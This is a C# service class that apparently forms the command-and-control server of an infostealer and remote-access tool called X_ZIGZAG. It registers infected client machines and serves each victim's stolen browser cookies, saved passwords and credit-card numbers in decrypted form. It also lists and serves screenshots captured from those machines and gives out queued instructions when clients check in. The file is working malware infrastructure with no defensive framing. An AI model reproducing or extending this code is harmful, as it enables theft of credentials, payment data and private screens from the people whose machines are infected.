using Microsoft.AspNetCore.Mvc;
using Microsoft.EntityFrameworkCore;
using X_ZIGZAG_SERVER_WEB_API.Data;
using X_ZIGZAG_SERVER_WEB_API.Interfaces;
using X_ZIGZAG_SERVER_WEB_API.Models;
using X_ZIGZAG_SERVER_WEB_API.ViewModels.Request;
using X_ZIGZAG_SERVER_WEB_API.ViewModels.Response;
using SixLabors.ImageSharp;
using SixLabors.ImageSharp.Processing;

namespace X_ZIGZAG_SERVER_WEB_API.Services
{
    public class ClientService:IClientService
    {
        private readonly MyDbContext _context;
        private readonly IWebHostEnvironment _environment;

        public ClientService(MyDbContext context, IWebHostEnvironment environment)
        {
            _context = context;
            _environment = environment;
        }
        [HttpGet]
        public async Task<ClientResponse> GetAll()
        {
            return new ClientResponse { DevicesInfo = await _context.SystemsInfo.Select(u => new ClientInfoResponseVM
            {
                Id=u.Id,
                Name = u.Name,
                CustomName = u.CustomName,
                Created = u.Created,
                LatestUpdate = u.LatestUpdate,
                IpAddress = u.IpAddress,
                Version = u.Version,
                SystemSpecs = u.SystemSpecs,
                LatestPing = _context.CheckSettings
                        .Where(us => us.Id.Equals(u.Id))
                        .Select(usd => usd.LatestPing)
                        .FirstOrDefault(),
                CheckDuration = _context.CheckSettings
                        .Where(cs => cs.Id.Equals(u.Id))
                        .Select(cs => (uint?)cs.CheckDuration)
                        .FirstOrDefault() ?? 0
            }).ToListAsync()
            }; ;
        }
        [HttpGet]
        public async Task<ClientInfoResponseVM>? GetOne(string uuid)
        {
            var clientInfo = await _context.SystemsInfo
                .Where(u => u.Id.Equals(uuid))
                .Select(u => new ClientInfoResponseVM
                {
                    Name = u.Name,
                    CustomName = u.CustomName,
                    Created = u.Created,
                    LatestUpdate = u.LatestUpdate,
                    IpAddress = u.IpAddress,
                    Version = u.Version,
                    SystemSpecs = u.SystemSpecs,
                    LatestPing = _context.CheckSettings
                        .Where(us=>us.Id.Equals(uuid))
                        .Select(usd=>usd.LatestPing)
                        .FirstOrDefault(),
                    CheckDuration = _context.CheckSettings
                        .Where(cs => cs.Id.Equals(uuid))
                        .Select(cs => (uint?)cs.CheckDuration)
                        .FirstOrDefault() ?? 0
                })
                .FirstOrDefaultAsync();
            return clientInfo;
        }
        [HttpPost]
        public async Task<Boolean> Login(ClientLoginVM LoginInfo)
        {
            var AlreadyExist = await _context.SystemsInfo.AnyAsync(u => u.Id.Equals(LoginInfo.Id));
            if (!AlreadyExist)
            {
                return false;
            }
            return true;
        }
        public async Task<List<CookieVM>> GetCookies(string uuid)
        {
            var userExist = await _context.SystemsInfo.AnyAsync(u=>u.Id.Equals(uuid));
            if (userExist){
                return await _context.Cookies.Where(ud => ud.ClientId.Equals(uuid)).Select(c => new CookieVM { Browser = c.BrowserName, Origin = c.Origin, Expire = c.ExpireDate, Name = c.Name, Value = c.Value }).ToListAsync();
            }
            return null;
        }
        public async Task<List<CreditCardVM>> GetCreditCards(string uuid)
        {
            var userExist = await _context.SystemsInfo.AnyAsync(u => u.Id.Equals(uuid));
            if (userExist)
            {
                return await _context.CreditCards.Where(ud => ud.ClientId.Equals(uuid)).Select(c => new CreditCardVM { Browser = c.BrowserName, Origin = c.Origin, Expire = c.ExpireDate, Name = c.CardHolder, Value = c.DecrypredCreditCard}).ToListAsync();
            }
            return null;
        }
        public async Task<UpdateClientSettingsVM> UpdateSetting(string uuid, SettingsRequestVM setting)
        {
            var clientSettings= await _context.CheckSettings.Where(u => u.Id.Equals(uuid)).FirstOrDefaultAsync();
            if (clientSettings != null)
            {
                clientSettings.CheckDuration = setting.CheckDuration ?? clientSettings.CheckDuration;
                clientSettings.Screenshot = setting.Screenshot?? clientSettings.Screenshot;
                if(setting.CustomName!= null)
                {
                    var userInfo = await _context.SystemsInfo.Where(u => u.Id.Equals(uuid)).FirstOrDefaultAsync();
                    userInfo.CustomName= setting.CustomName;
                    _context.Update(userInfo);
                }
                await _context.SaveChangesAsync();
                return null;
            }
            return new UpdateClientSettingsVM { Message = "The Client Doesn't Exist" };
        }
        public async Task<List<PasswordVM>> GetPasswords(string uuid)
        {
            var userExist = await _context.SystemsInfo.AnyAsync(u => u.Id.Equals(uuid));
            if (userExist)
            {
                return await _context.Passwords.Where(ud=>ud.ClientId.Equals(uuid)).Select(c => new PasswordVM { Browser = c.BrowserName, Url = c.Url, Login = c.Login, Value = c.DecrypredPassword}).ToListAsync();
            }
            return null;
        }
        public async Task<ScreensVM>? GetScreenshots(string uuid)
        {
            var clientSetting = await _context.CheckSettings.AsNoTracking().Where(u => u.Id.Equals(uuid)).FirstOrDefaultAsync();
            if (clientSetting==null)
            {
                return null;
            }
            string uploadsFolder = Path.Combine(_environment.ContentRootPath, "Screenshots", uuid);
            List<Screen>? Screens = new List<Screen>();
            try
            {
                if (Directory.Exists(uploadsFolder))
                {
                    string[] directories = Directory.GetDirectories(uploadsFolder);
                    foreach (string directory in directories)
                    {
                        Screen screen = new Screen { Id = Path.GetFileName(directory) };
                        string[] files = Directory.GetFiles(directory);
                        List<Screenshot> screenshots = new List<Screenshot>();
                        foreach (string file in files)
                        {
                            screenshots.Add(new Screenshot { ScreenshotId = Path.GetFileName(file) });
                        }
                        screen.Screenshots= screenshots;
                        Screens.Add(screen);
                    }
                }
               
            }
            catch (Exception ex)
            {
                Console.WriteLine("An error occurred: " + ex.Message);
            }
            return new ScreensVM { Screens=Screens,Duration= clientSetting.Screenshot};
        }
        public FileResult? GetScreenshot(string uuid,int screenIndex, string screenshotFileName)
        {
            string imagePath = Path.Combine(_environment.ContentRootPath, "Screenshots", uuid, screenIndex.ToString(), screenshotFileName);
            var image = RetrieveFile(imagePath);
            if (image.Item1)
            {
                return new FileContentResult(image.Item2, "image/jpeg");
            }
            return null;
        }
        public FileResult? GetScreenshotPreview(string uuid, int screenIndex, string screenshotFileName)
        {
            var imagePath = Path.Combine(_environment.ContentRootPath, "Screenshots", uuid, screenIndex.ToString(), screenshotFileName);
            using var image = Image.Load(imagePath);
            image.Mutate(x => x.Resize(200, 0));
            using var ms = new MemoryStream();
            image.SaveAsJpeg(ms);
            return new FileContentResult(ms.ToArray(), "image/jpeg");
        }
        public async Task<ClientActionResponse> SignUp(ClientInfoVM Info)
        {
            var AlreadyExist = await _context.SystemsInfo.AnyAsync(u => u.Id.Equals(Info.Id));
            if (!AlreadyExist)
            {
                var newClient = new SystemInfo {
                    Id = Info.Id,
                    Name = Info.Name,
                    IpAddress = Info.IpAddress,
                    Version = Info.Version,
                    SystemSpecs = Info.SystemSpecs,
                    Created = DateTimeOffset.UtcNow,
                    LatestUpdate = DateTimeOffset.UtcNow,
                };
                var newClientConfig = new CheckSetting {
                    Id=Info.Id,
                    Screenshot = 0,
                    CheckDuration = 60,
                    CheckCmds=false,
                    LatestPing= DateTimeOffset.UtcNow,
                };
                await _context.CheckSettings.AddAsync(newClientConfig);
                await _context.SystemsInfo.AddAsync(newClient);
                await _context.SaveChangesAsync();
            }
            return new ClientActionResponse { Code = 1 };
        }
        public async Task<ClientActionResponse> UpdateInfo(ClientInfoVM Info,long instructionId)
        {
            var InstExist = await _context.Instructions.Where(inst => inst.ClientId.Equals(Info.Id) && inst.InstructionId.Equals(instructionId) && inst.Code == -2).AnyAsync();
            var UserData= await _context.SystemsInfo.Where(u => u.Id.Equals(Info.Id)).FirstOrDefaultAsync();
            if (InstExist && UserData != null)
            {
                UserData.Id=Info.Id;
                UserData.Name=Info.Name;
                UserData.IpAddress=Info.IpAddress;
                UserData.Version=Info.Version;
                UserData.SystemSpecs=Info.SystemSpecs;
                UserData.LatestUpdate = DateTimeOffset.UtcNow;
                _context.SystemsInfo.Update(UserData);
                await _context.Instructions.Where(inst => inst.ClientId.Equals(Info.Id) && inst.InstructionId.Equals(instructionId) && inst.Code == -2).ExecuteDeleteAsync();
                await _context.SaveChangesAsync();
            }
            return new ClientActionResponse { Code = 1 };
        }
        public async Task<ClientPingResponse> Check(string uuid)
        {
            var CheckConfig = await _context.CheckSettings.Where(u=> u.Id.Equals(uuid)).FirstOrDefaultAsync();
            
            if(CheckConfig != null)
            {
                CheckConfig.LatestPing = DateTimeOffset.UtcNow;
                var PingResponse = new ClientPingResponse { NextPing=CheckConfig.CheckDuration};
                if (CheckConfig.Screenshot != 0)
                {
                    PingResponse.Screenshot= CheckConfig.Screenshot;
                }
                if (CheckConfig.CheckCmds)
                {
                    var instructionsList = await _context.Instructions
                        .Where(u => u.ClientId.Equals(CheckConfig.Id))
                        .Select(i => new InstructionResponseVM
                        {
                            InstructionId = i.InstructionId,
                            Code = i.Code,
                            FunctionArgs = i.FunctionArgs
                        })
                        .ToListAsync();
                    if (instructionsList.Count == 0) {
                        CheckConfig.CheckCmds = false;
                    }
                    else
                    {
                        PingResponse.Instructions = instructionsList;
                    }

                }






                _context.CheckSettings.Update(CheckConfig);
                await _context.SaveChangesAsync();
                return PingResponse;
            }
            return new ClientPingResponse { Code = -1 ,NextPing=0 };
        }


        private (bool, byte[]) RetrieveFile(string Path)
        {

            if (System.IO.File.Exists(Path))
            {
                byte[] Bytes = System.IO.File.ReadAllBytes(Path);
                return (true, Bytes);
            }

            return (false, null);
        }
    }
}
